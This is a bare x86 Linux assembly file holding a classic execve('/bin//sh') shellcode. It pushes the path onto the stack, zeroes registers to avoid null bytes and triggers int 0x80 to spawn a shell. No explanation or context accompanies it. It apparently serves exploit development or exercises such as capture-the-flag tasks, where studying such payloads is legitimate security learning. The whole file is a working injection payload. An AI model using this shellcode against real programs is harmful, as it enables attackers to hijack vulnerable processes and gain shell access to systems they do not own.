.intel_syntax noprefix 
.globl _start

_start:
    push 0xb 
    pop eax 
    xor esi, esi
    push esi
    push 0x68732f2f # b'//sh'
    push 0x6e69622f # b'/bin'
    mov ebx, esp 
    xor ecx, ecx
    xor edx, edx 
    int 0x80
